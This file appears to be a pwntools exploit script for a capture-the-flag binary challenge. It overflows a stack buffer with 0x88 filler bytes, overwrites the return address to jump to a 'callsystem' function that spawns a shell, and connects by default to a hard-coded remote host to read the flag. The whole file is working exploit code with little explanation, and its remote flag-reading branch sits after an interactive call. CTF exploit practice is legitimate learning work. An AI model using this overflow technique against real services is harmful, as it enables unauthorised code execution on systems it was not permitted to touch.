#!/usr/bin/env python3
#! -*- coding : utf-8 -*-

import os, sys
from pwn import *
from ctypes import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

target=['./291721f42a044f50a2aead748d539df0']
use_gdb = False
#use_gdb = True

#def exp(ip = None, port = None, use_gdb = False):
def exp(ip = None, port = None):
    global use_gdb
    remote_run = False
    flag = None
    if ip and port:
        p = remote(ip, port)
        use_gdb = False
        remote_run = True
    else:
        p=process(target)
    if use_gdb:
        gdb.attach(p)
        pause()

    callsystem=0x400596
    p.recvuntil("Hello, World\n")
    payload = b"a" * 0x80 + b'b'*8 + p64(callsystem)
    p.send(payload)
    
    #p.recv()
    p.interactive()
    if remote_run:
        p.sendline('cat flag')
        flag = p.recvuntil(b'\n')
    else:
        p.interactive()

    log.info(flag)

if __name__ == "__main__":
    ip, port = None, None
    remote_str = None
    remote_str = '220.249.52.133:37099'

    if len(sys.argv) > 1:
        remote_str = sys.argv[1]
    if remote_str:
        ip, port = remote_str.split(":")

    exp(ip, port)
